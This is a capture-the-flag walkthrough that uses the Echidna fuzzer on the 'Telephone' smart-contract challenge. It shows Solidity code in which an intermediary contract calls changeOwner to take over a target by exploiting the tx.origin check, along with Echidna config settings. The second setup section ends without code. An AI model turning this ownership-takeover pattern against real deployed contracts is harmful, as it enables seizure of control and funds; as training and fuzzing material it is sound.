# Telephone Walkthrough
This walkthrough requires interacting with the target via a different contract. This gives us two different ways in which we can run this test. The first way is to let our test contract call the attacker contract. The other way, which maybe more realistic, is to let the fuzzer call the attack contract. 

The objective is to take ownership of the target.

## Setup 1
Create the config.yaml:
```yaml
contractAddr: "0x4242"
```

This is not strictly necessary as the contract will be deployed to the default address of `0x00a329c0648769a73afac7f9381e08fb43dbea72`. But to make things easier, I just decided to set the contract address to something smaller.

## Test Setup 1

In this test, we will use two contracts and the test contract's constructor to take ownership of the target.
```javascript
pragma solidity ^0.6.0;

import './Telephone.sol';

contract RingRing {
  Test phone = Test(0x4242);
  
  function pwn() public {
    phone.changeOwner(address(0x10000));
  }
}

contract Test is Telephone {
    RingRing ring;
  constructor() Telephone() public payable {
    // hint echidna
    ring = new RingRing();
  }

  function callPwn() public {
      ring.pwn();
  }

    function echidna_test_origin() public returns (bool) {
        if (tx.origin == owner) {
            return false;
        } else {
            return true;
        }
    }    
}
```

## Setup 2
## Setup 1
Create the config.yaml:
```yaml
contractAddr: "0x4242"
multi-abi: true
```

This is not strictly necessary as the contract will be deployed to the default address of `0x00a329c0648769a73afac7f9381e08fb43dbea72`. But to make things easier, I just decided to set the contract address to something smaller.

The second line `multi-abi: true` is needed to allow the echidna to call into any contract with a known ABI.

## Test Setup 2
In this setup, the fuzzer will call public functions from both the Test contract and the RingRing contract.

